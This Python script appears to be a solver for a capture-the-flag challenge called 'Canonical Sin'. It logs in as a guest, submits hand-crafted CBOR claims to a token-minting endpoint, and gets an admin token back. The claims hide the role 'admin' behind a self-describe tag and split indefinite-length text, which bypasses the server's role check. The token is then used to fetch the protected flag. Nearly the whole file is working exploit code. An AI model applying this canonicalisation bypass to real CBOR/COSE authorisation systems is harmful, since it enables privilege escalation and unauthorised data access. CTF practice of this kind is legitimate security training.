#!/usr/bin/env python3
"""Canonical Sin -- faithful reconstruction as a single script.

Original ran in an ephemeral scratchpad; same bytes/endpoints, re-expressed here.
Requires the live service (server mints and signs; no key material embedded).

Flow: login (guest/guest123) -> vault/list -> flag as guest (expect 403)
    -> POST /auth/mint with crafted extra_claims_b64u -> flag as minted admin.

Usage: python3 solve.py [https://isfcrpesu-canonical-sin.chals.io]
"""
import base64
import json
import sys
import urllib.request

import cbor2

HOST = sys.argv[1] if len(sys.argv) > 1 else "https://isfcrpesu-canonical-sin.chals.io"

# A2 { role: Tag(55799, indef-text "ad"+"min"), caps: ["read:vault"] }
# a2 | 64"role" | d9d9f7 Tag(55799) | 7f 62"ad" 63"min" ff | 64"caps" | 81 | 6a"read:vault"
MANUAL_HEX = "a264726f6c65d9d9f77f626164636d696eff6463617073816a726561643a7661756c74"
EXTRA_CLAIMS_B64U = "omRyb2xl2dn3f2JhZGNtaW7_ZGNhcHOBanJlYWQ6dmF1bHQ"

USER = "guest"
PASS = "guest123"


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def api(method: str, path: str, token: str | None = None, body: dict | None = None):
    req = urllib.request.Request(
        HOST + path,
        data=json.dumps(body).encode() if body is not None else None,
        method=method,
        headers={"Content-Type": "application/json"},
    )
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode() or "{}")
        except Exception:
            return e.code, {}


def cose_payload_info(token: str):
    """Best-effort decode of the COSE_Sign1 payload for display (server verifies)."""
    raw = token.strip()
    pad = "=" * (-len(raw) % 4)
    for cand in (raw + pad, raw):
        try:
            outer = cbor2.loads(base64.urlsafe_b64decode(cand + pad))
            if isinstance(outer, list) and len(outer) == 4 and isinstance(outer[2], bytes):
                return cbor2.loads(outer[2])
            if isinstance(outer, dict):
                return outer
        except Exception:
            continue
    return {"undecoded": token[:40] + "..."}


def main() -> None:
    # 1. Manual CBOR bytes + cbor2 cross-check (vault view strips Tag 55799 -> "admin").
    manual = bytes.fromhex(MANUAL_HEX)
    assert b64u_encode(manual) == EXTRA_CLAIMS_B64U, "hex/b64u mismatch"
    decoded = cbor2.loads(manual, tag_hook=lambda d, t: t)
    assert decoded == {"role": "admin", "caps": ["read:vault"]}, decoded
    print(f"[+] crafted CBOR cross-check ok: {decoded}")

    # 2. Login as guest.
    st, resp = api("POST", "/auth/login", body={"username": USER, "password": PASS})
    assert st == 200, (st, resp)
    guest = resp.get("token") or resp.get("access_token") or resp.get("jwt")
    assert guest, resp
    print(f"[+] login ok, payload={cose_payload_info(guest)}")

    # 3. Enumerate vault; guest flag fetch must 403.
    st, listing = api("GET", "/vault/list", token=guest)
    print(f"[+] /vault/list -> {st} {listing}")
    st, denied = api("GET", "/vault/secret/flag", token=guest)
    print(f"[+] guest /vault/secret/flag -> {st} {denied}")
    assert st == 403, (st, denied)

    # 4. Mint tagged-admin claims (server re-signs; no local key material needed).
    st, minted = api("POST", "/auth/mint", token=guest,
                     body={"extra_claims_b64u": EXTRA_CLAIMS_B64U})
    assert st == 200, (st, minted)
    admin_tok = minted.get("token") or minted.get("access_token") or minted.get("minted_token")
    assert admin_tok, minted
    print(f"[+] mint ok, payload(view)={cose_payload_info(admin_tok)}")

    # 5. Fetch flag with minted token, twice.
    flags = []
    for i in range(2):
        st, flag_resp = api("GET", "/vault/secret/flag", token=admin_tok)
        assert st == 200, (st, flag_resp)
        flag = flag_resp.get("flag") or flag_resp.get("secret") or str(flag_resp)
        flags.append(flag)
        print(f"[+] flag fetch {i + 1} -> {flag}")
    assert flags[0] == flags[1]
    print(flags[0])


if __name__ == "__main__":
    main()
